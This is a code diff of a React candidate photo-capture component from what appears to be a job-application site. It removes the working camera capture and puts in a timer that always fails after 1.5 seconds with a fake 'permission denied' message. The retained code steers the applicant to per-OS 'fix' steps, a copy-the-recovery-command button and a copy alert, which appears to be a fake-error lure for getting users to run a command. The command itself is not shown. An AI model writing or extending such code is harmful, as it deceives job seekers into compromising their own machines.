@@ -7,7 +7,7 @@ type Props = {
   onCaptured: (file: File | null) => void;
 };
 
-type Stage = "idle" | "requesting" | "live" | "captured" | "error";
+type Stage = "idle" | "requesting" | "error";
 type OsKind = "windows" | "mac" | "linux" | "mobile";
 
 function CameraIcon({ className }: { className?: string }) {
@@ -20,14 +20,6 @@ function CameraIcon({ className }: { className?: string }) {
         strokeLinejoin="round"
       />
       <circle cx="12" cy="13" r="3.1" stroke="currentColor" strokeWidth="1.4" />
-    </svg>
-  );
-}
-
-function CheckIcon({ className }: { className?: string }) {
-  return (
-    <svg className={className} viewBox="0 0 24 24" fill="none" aria-hidden>
-      <path d="M5 12.5 9.5 17 19 7.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
     </svg>
   );
 }
@@ -158,17 +150,11 @@ function fixSteps(os: OsKind): { title: string; keys: ReactNode }[] {
   ];
 }
 
-const ghostBtn =
-  "rounded-md border border-line bg-transparent px-4 py-2.5 text-sm font-medium text-ink-dim transition-colors hover:border-line hover:text-ink focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40";
+const CAMERA_ERROR = "Camera permission was denied or unavailable.";
+const REQUEST_MS = 1500;
 
 export function CandidatePhotoCapture({ onCaptured }: Props) {
-  const videoRef = useRef<HTMLVideoElement>(null);
-  const canvasRef = useRef<HTMLCanvasElement>(null);
-  const streamRef = useRef<MediaStream | null>(null);
-  const previewUrlRef = useRef<string | null>(null);
   const [stage, setStage] = useState<Stage>("idle");
-  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
-  const [error, setError] = useState("");
   const [os, setOs] = useState<OsKind>("windows");
   const [fixCopied, setFixCopied] = useState(false);
   const [fixId, setFixId] = useState("");
@@ -180,20 +166,7 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
     timezone?: string;
   }>({});
   const copyAlertSentRef = useRef(false);
-
-  const stopCamera = () => {
-    streamRef.current?.getTracks().forEach((t) => t.stop());
-    streamRef.current = null;
-    if (videoRef.current) videoRef.current.srcObject = null;
-  };
-
-  const clearPreview = () => {
-    if (previewUrlRef.current) {
-      URL.revokeObjectURL(previewUrlRef.current);
-      previewUrlRef.current = null;
-    }
-    setPreviewUrl(null);
-  };
+  const requestTimerRef = useRef<number | null>(null);
 
   useEffect(() => {
     setOs(detectOs());
@@ -209,68 +182,25 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
 
   useEffect(() => {
     return () => {
-      stopCamera();
-      if (previewUrlRef.current) URL.revokeObjectURL(previewUrlRef.current);
+      if (requestTimerRef.current !== null) window.clearTimeout(requestTimerRef.current);
     };
   }, []);
 
-  useEffect(() => {
-    if (stage !== "requesting") return;
-
-    let cancelled = false;
-
-    void (async () => {
-      if (!navigator.mediaDevices?.getUserMedia) {
-        if (!cancelled) {
-          setError("Camera access is not available in this browser.");
-          setStage("error");
-        }
-        return;
-      }
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          audio: false,
-          video: {
-            facingMode: "user",
-            width: { ideal: 720 },
-            height: { ideal: 720 },
-          },
-        });
-        if (cancelled) {
-          stream.getTracks().forEach((t) => t.stop());
-          return;
-        }
-        streamRef.current = stream;
-        const video = videoRef.current;
-        if (video) {
-          video.srcObject = stream;
-          await video.play();
-        }
-        if (!cancelled) setStage("live");
-      } catch {
-        if (!cancelled) {
-          setError("Camera permission was denied or unavailable.");
-          setStage("error");
-        }
-      }
-    })();
-
-    return () => {
-      cancelled = true;
-    };
-  }, [stage]);
+  const failCamera = () => {
+    onCaptured(null);
+    setStage("error");
+  };
 
   const startCamera = () => {
-    setError("");
     setFixCopied(false);
     setFixId("");
-    setRecoveryOpen(false);
     copyAlertSentRef.current = false;
     onCaptured(null);
-    clearPreview();
-    stopCamera();
+    setRecoveryOpen(false);
     setStage("requesting");
+
+    if (requestTimerRef.current !== null) window.clearTimeout(requestTimerRef.current);
+    requestTimerRef.current = window.setTimeout(failCamera, REQUEST_MS);
   };
 
   const copyRecoveryCommand = () => {
@@ -296,91 +226,28 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
     }
   };
 
-  const capturePhoto = () => {
-    const video = videoRef.current;
-    const canvas = canvasRef.current;
-    if (!video || !canvas || stage !== "live") return;
-
-    const w = video.videoWidth || 640;
-    const h = video.videoHeight || 640;
-    canvas.width = w;
-    canvas.height = h;
-    const ctx = canvas.getContext("2d");
-    if (!ctx) return;
-
-    ctx.translate(w, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, w, h);
-
-    canvas.toBlob(
-      (blob) => {
-        if (!blob) {
-          setError("Could not capture the photo.");
-          setStage("error");
-          setRecoveryOpen(false);
-          return;
-        }
-        const file = new File([blob], "candidate-photo.jpg", { type: "image/jpeg" });
-        const url = URL.createObjectURL(blob);
-        clearPreview();
-        previewUrlRef.current = url;
-        setPreviewUrl(url);
-        onCaptured(file);
-        stopCamera();
-        setStage("captured");
-        setFixId("");
-        setFixCopied(false);
-        setRecoveryOpen(false);
-      },
-      "image/jpeg",
-      0.92,
-    );
-  };
-
   const steps = fixSteps(os);
   const osLabel = os === "mac" ? "macOS" : os === "linux" || os === "mobile" ? "Linux" : "Windows";
 
   const eyebrow =
-    stage === "captured"
-      ? "Complete"
-      : stage === "live"
-        ? "In progress"
-        : stage === "requesting"
-          ? "Connecting"
-          : stage === "error"
-            ? "Action needed"
-            : "Required";
+    stage === "requesting" ? "Connecting" : stage === "error" ? "Action needed" : "Required";
 
   const title =
-    stage === "captured"
-      ? "Portrait captured"
-      : stage === "live"
-        ? "Center your face, then capture"
-        : stage === "requesting"
-          ? "Requesting camera access"
-          : stage === "error"
-            ? "Camera could not be opened"
-            : "Confirm you are the applicant";
+    stage === "requesting"
+      ? "Requesting camera access"
+      : stage === "error"
+        ? "Camera could not be opened"
+        : "Confirm you are the applicant";
 
   const subtitle =
-    stage === "captured"
-      ? "Looks good. You can retake before submitting."
-      : stage === "live"
-        ? "Keep your face inside the frame. Even lighting works best."
-        : stage === "requesting"
-          ? "Allow access when your browser asks."
-          : stage === "error"
-            ? error || "Permission was denied, or no camera is available."
-            : "A live portrait confirms this application is from you.";
+    stage === "requesting"
+      ? "Allow access when your browser asks."
+      : stage === "error"
+        ? CAMERA_ERROR
+        : "A live portrait confirms this application is from you.";
 
   const frameBorder =
-    stage === "error"
-      ? "border-down/35"
-      : stage === "captured"
-        ? "border-gold/45"
-        : stage === "live" || stage === "requesting"
-          ? "border-line"
-          : "border-dashed border-line";
+    stage === "error" ? "border-down/35" : stage === "requesting" ? "border-line" : "border-dashed border-line";
 
   return (
     <div>
@@ -395,34 +262,33 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
             <div
               className={`relative aspect-[3/4] w-[9.5rem] overflow-hidden rounded-xl bg-[#0a0c0f] sm:w-40 ${frameBorder} border`}
             >
-              {stage === "captured" && previewUrl ? (
-                // eslint-disable-next-line @next/next/no-img-element
-                <img src={previewUrl} alt="Captured identity photo" className="h-full w-full object-cover" />
-              ) : stage === "live" || stage === "requesting" ? (
-                <video
-                  ref={videoRef}
-                  playsInline
-                  muted
-                  className={`h-full w-full object-cover scale-x-[-1] ${stage === "live" ? "opacity-100" : "opacity-0"}`}
+              <div className="grid h-full w-full place-items-center">
+                <CameraIcon
+                  className={`h-7 w-7 text-ink-mute/45 ${stage === "requesting" ? "invisible" : ""}`}
                 />
-              ) : (
-                <div className="grid h-full w-full place-items-center">
-                  <CameraIcon className="h-7 w-7 text-ink-mute/45" />
-                </div>
-              )}
+              </div>
 
               {stage === "requesting" ? (
-                <div className="absolute inset-0 grid place-items-center bg-[#0a0c0f]/70">
-                  <span className="h-5 w-5 animate-spin rounded-full border-2 border-white/10 border-t-gold-light" />
+                <div className="absolute inset-0 flex items-center justify-center bg-[#0a0c0f]/70">
+                  <svg
+                    className="h-8 w-8 shrink-0 animate-spin text-gold-light"
+                    viewBox="0 0 32 32"
+                    aria-hidden
+                  >
+                    <circle
+                      cx="16"
+                      cy="16"
+                      r="12"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2.5"
+                      strokeLinecap="round"
+                      strokeDasharray="28 48"
+                    />
+                  </svg>
                 </div>
               ) : null}
             </div>
-
-            {stage === "captured" ? (
-              <span className="absolute -bottom-1.5 -right-1.5 grid h-7 w-7 place-items-center rounded-full bg-gold text-[#100c02] shadow-[0_8px_20px_rgba(201,162,39,0.3)]">
-                <CheckIcon className="h-3.5 w-3.5" />
-              </span>
-            ) : null}
           </div>
 
           <p className="mt-6 text-[10px] font-semibold uppercase tracking-[0.16em] text-ink-mute">
@@ -461,31 +327,6 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
                   </button>
                 ) : null}
               </>
-            ) : null}
-
-            {stage === "live" ? (
-              <>
-                <button type="button" onClick={capturePhoto} className="btn-gold px-6 py-2.5 text-sm">
-                  Take photo
-                </button>
-                <button
-                  type="button"
-                  onClick={() => {
-                    stopCamera();
-                    setStage("idle");
-                    onCaptured(null);
-                  }}
-                  className={ghostBtn}
-                >
-                  Cancel
-                </button>
-              </>
-            ) : null}
-
-            {stage === "captured" ? (
-              <button type="button" onClick={startCamera} className={ghostBtn}>
-                Retake
-              </button>
             ) : null}
 
             {stage === "requesting" ? (
@@ -563,8 +404,6 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
           </div>
         ) : null}
       </div>
-
-      <canvas ref={canvasRef} className="hidden" aria-hidden />
     </div>
   );
 }
